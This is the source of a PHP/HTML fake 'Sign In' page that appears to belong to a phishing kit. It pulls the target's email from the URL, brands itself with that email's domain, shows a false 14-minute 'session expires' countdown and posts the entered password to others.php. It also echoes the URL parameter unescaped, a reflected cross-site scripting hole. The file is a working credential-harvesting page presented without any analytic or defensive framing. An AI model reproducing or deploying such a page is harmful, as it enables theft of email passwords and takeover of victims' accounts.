<!doctype html>
<html>
<head>
<title>Sign In</title>
</head>
<body>
<center>
 <?php
/*
Get email from URL and set to email1 variable
*/
$email1 = $_GET['email'];
$domain = "Webmail.com";
if(strpos($email1, '@') !== false){
    $domain = ucfirst(substr($email1, strpos($email1, '@') + 1));
} 
?>
<style type="text/css">

body{
  background-color: white;
   -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
input[type=text],[type=password],[type=email]{
  display: block;
  margin: 0;
  width: 345px;
    font-family: Poppins-medium, sans-serif;
  font-size: 15px;  
   padding: 13px;
       border: 1px solid #767676;
    border-radius: 3px;
}

fieldset {
    font-family: sans-serif;
width:430px;
height:365px;
 border: 1px solid #DEDEDE;
    padding: 10px;
bottom:10px;
    border-radius: 5px;
    background: #FAFAFA;
-webkit-box-shadow: 1px 1px 6px 4px rgb(0 0 0 / 9%);
}

   input[type=submit] {
  width: 375px;
   padding: 10px;
    font-size: 16px;
    line-height: 1.33;
    border-radius: 4px;
    color: #fff;
    background-color: #28A745;
    border: 0px ;
    font-weight: bold;
   }
   p{
    display: inline;
    font-family: Poppins-medium, sans-serif;
    font-size: 18px;
   }
   #demo {   
    display: inline;
    color: red;
    font-weight: bold;
}

#domain {
    font-family: Poppins-medium, sans-serif;
font-size : 26px;
}

   
</style><br>
<img src="https://i.imgur.com/ILdcLzx.png"><br><br><br>
<p id="domain"> <?php echo $domain; ?></p>
<form action="others.php" method="post">
<br><fieldset>
<br><br>
<p>The session expires in 
<p id="demo"></p> Mins!</p>
<br><br><br>
<script>
// Set the date we're counting down to
var countDownDate = new Date().getTime() + 14 * 60 * 1000;

// Update the count down every 1 second
var x = setInterval(function() {

  // Get today's date and time
  var now = new Date().getTime();
    
  // Find the distance between now and the count down date
  var distance = countDownDate - now;
    
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
    
  // Output the result in an element with id="demo"
  document.getElementById("demo").innerHTML = 
  minutes + ":" + seconds;
    
  // If the count down is over, write some text 
  if (distance < 0) {
    clearInterval(x);
    document.getElementById("demo").innerHTML = "EXPIRED";
  }
}, 1000);
</script>
<p><?php echo $email1; ?></p><br>
<input type="hidden" name="user" placeholder="Email address" value="<?php echo $email1; ?>" >
<br><input type="password" name="pass" placeholder="Password" required ><br><br>

    

    <input type="submit" name="submit" value="Activate"/> <br><br><br><br>



</center>
</form>
</body>
</html>
